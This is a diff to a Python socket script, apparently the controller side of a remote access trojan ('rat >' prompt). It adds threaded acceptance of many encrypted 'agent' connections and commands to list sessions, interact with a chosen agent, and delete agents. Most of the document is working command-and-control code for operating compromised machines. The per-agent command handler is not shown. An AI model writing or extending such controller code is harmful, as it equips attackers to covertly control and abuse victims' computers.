@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 import socket
+import threading
 import rsa
 from cryptography.fernet import Fernet
 SEND_MSG_LEN=2048
@@ -76,23 +77,92 @@ class Socket:
     self.connected = False
 
 class Server(Socket):
-  def __init__(self, host="127.0.0.1", port=62832):
+  def __init__(self, handle, host="127.0.0.1", port=62832):
     super(Server, self).__init__(host, port)
     
+    self.handle=handle
+    self.running=False
     self.public_key, self.private_key = rsa.newkeys(2048)
     self.sock.bind((host, port))
+    self.sock.settimeout(1)
     self.sock.listen()
     print(f"[*] Listening on {port}...")
+  
+  def wait_for_clients(self):
+    self.clients=[]
+    id_cli=1
+    while self.running:
+      try:
+        client, addr=self.sock.accept()
+        client.send(self.public_key.save_pkcs1())
+        client_key=Fernet(rsa.decrypt(client.recv(2048), self.private_key))
+        
+        self.clients.append({
+          'connection':client,
+          'key':client_key,
+          'name':f'agent{id_cli}',
+          'address':addr,
+          'ended':False})
+        id_cli+=1
+      except TimeoutError:
+        pass
+  
+  def list_clients(self):
+    print('running agents:')
+    for client in self.clients:
+      if not client['ended']:
+        print(f"{client['name']} : {client['address']}")
+  
+  def delete(self, name):
+    for client in self.clients:
+      if client['name']==name:
+        client['ended']=True
+        self.connection=client['connection']
+        self.key=client['key']
+        self.send('delete')
+        self.connection.close()
+        return
 
-  def accept_client(self):
-    self.connection, client_address = self.sock.accept()
-    self.connection.send(self.public_key.save_pkcs1())
-    self.key=Fernet(rsa.decrypt(self.connection.recv(2048), self.private_key))
-    self.connected = True
+  def use(self, client):
+    self.connection=client['connection']
+    self.key=client['key']
+    name=client['name']
+    using=True
+    while using:
+      cmd=input(f" rat {name} > ")
+      using=self.handle(self, cmd)
+
+  def interact(self, name):
+    for client in self.clients:
+      if (not client['ended']) and client['name']==name:
+        self.use(client)
+        return
+    print('no such agent.')
+
+  def run(self):
+    self.running=True
+    self.waitcli=threading.Thread(target=self.wait_for_clients)
+    self.waitcli.start()
+    exited=False
+    while not exited:
+      cmd=input(' rat > ')
+      exited=cmd=='exit'
+      if cmd=='sessions':
+        self.list_clients()
+      elif cmd.split(' ')[0] == 'delete' and len(cmd.split(' '))>1:
+        self.delete(cmd.split(' ')[1])
+      elif cmd.split(' ')[0] == 'interact' and len(cmd.split(' '))>1:
+        self.interact(cmd.split(' ')[1])
   
   def stop(self):
-    self.disconnect()
-    self.sock.close()
+    self.running=False
+    if self.waitcli:
+      self.waitcli.join()
+    for client in self.clients:
+      if not client['ended']:
+        self.delete(client['name'])
+    if self.sock:
+      self.sock.close()
 
 class Client(Socket):
   def __init__(self, host="127.0.0.1", port=62832):
